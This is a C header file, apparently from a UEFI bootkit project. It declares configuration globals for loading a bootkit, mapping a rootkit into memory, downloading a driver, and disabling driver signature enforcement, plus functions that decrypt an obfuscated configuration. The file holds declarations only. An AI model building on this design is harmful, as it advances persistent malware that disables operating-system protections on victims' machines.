// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------



/**
	@file

	Functions Configuration
**/



// START -> GLOBAL VARIABLES ------------------------------------------------------------------------------------------------------------------
// START -> GLOBAL VARIABLES ------------------------------------------------------------------------------------------------------------------



extern CHAR16 *Global_PreBootConfiguration_FunctionsConfiguration_Screen;
extern CHAR16 *Global_PreBootConfiguration_FunctionsConfiguration_Banner;
extern CHAR16 *Global_PreBootConfiguration_FunctionsConfiguration_BannerImageAbyssSquid;
extern CHAR16 *Global_PreBootConfiguration_FunctionsConfiguration_BannerImageSquid;
extern CHAR16 *Global_PreBootConfiguration_FunctionsConfiguration_BannerAscii;
extern CHAR16 *Global_PreBootConfiguration_FunctionsConfiguration_UEFIReadWriteNTFSDriver;
extern CHAR16 *Global_PreBootConfiguration_FunctionsConfiguration_UEFIReadWriteNTFSDriverDownload;
extern CHAR16 *Global_PreBootConfiguration_FunctionsConfiguration_UEFIReadWriteNTFSDriverURL;
extern CHAR16 *Global_PreBootConfiguration_FunctionsConfiguration_UEFIReadWriteNTFSDriverPath;
extern CHAR16 *Global_PreBootConfiguration_FunctionsConfiguration_AdditionalComponent;
extern CHAR16 *Global_PreBootConfiguration_FunctionsConfiguration_AdditionalComponentPath;
extern CHAR16 *Global_PreBootConfiguration_FunctionsConfiguration_BootkitRuntime;
extern CHAR16 *Global_PreBootConfiguration_FunctionsConfiguration_BootkitRuntimePath;
extern CHAR16 *Global_PreBootConfiguration_FunctionsConfiguration_BootkitBoot;
extern CHAR16 *Global_PreBootConfiguration_FunctionsConfiguration_BootkitBootMapRootkitToMemory;
extern CHAR16 *Global_PreBootConfiguration_FunctionsConfiguration_BootkitBootMapRootkitToMemoryModule;
extern CHAR16 *Global_PreBootConfiguration_FunctionsConfiguration_DisableProtections;
extern CHAR16 *Global_PreBootConfiguration_FunctionsConfiguration_DisableProtectionsDSE;



// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------
// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------



/**
	@brief          Reads and decrypts the encrypted configuration data.
	@details        This function reads the encrypted configuration data, deobfuscates it using a combination of XOR and Caesar cipher techniques, decodes the result from Base64, and then decrypts it using AES in CBC mode. The decrypted configuration data and its size are returned to the caller.


	@param[out]     DecryptedConfiguration              Pointer to the buffer that will receive the decrypted configuration data.
	@param[out]     DecryptedConfigurationSize          Pointer to the variable that will receive the size of the decrypted configuration data buffer.


	@retval         EFI_SUCCESS                         The configuration data was successfully read and decrypted.
	@retval         EFI_OUT_OF_RESOURCES                There was not enough memory to allocate the necessary buffers.
	@retval         EFI_ABORTED                         The decryption process failed.
	@retval         EFI_INVALID_PARAMETER               One or more input parameters are NULL or invalid.
**/
EFI_STATUS
PreBootConfiguration_FunctionsConfiguration_ReadEncryptedConfiguration(
	OUT             UINT8                               **DecryptedConfiguration,
	OUT             UINTN                               *DecryptedConfigurationSize
);



/**
	@brief          Initializes configuration fields based on the provided JSON string.
	@details        It updates the global variables corresponding to different configuration parameters with the values obtained from the JSON.


	@param[in]      JsonString                  A pointer to a null-terminated JSON string containing the configuration data.


	@retval         EFI_SUCCESS                 The function completed successfully and all configuration fields have been initialized.
	@retval         EFI_OUT_OF_RESOURCES        Memory allocation failed while processing the configuration.
	@retval         EFI_INVALID_PARAMETER       The provided JSON string was invalid or could not be parsed.
**/
EFI_STATUS
PreBootConfiguration_FunctionsConfiguration_InitializeConfigurationFields(
	IN              CHAR8                       *JsonString
);



/**
	@brief          Prints (logs) the current value of every global configuration string.
	@details        After the JSON has been deserialized and the global variables populated, this function allows developers to quickly inspect their contents.
**/
VOID
PreBootConfiguration_FunctionsConfiguration_PrintConfigurationFields();



// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------
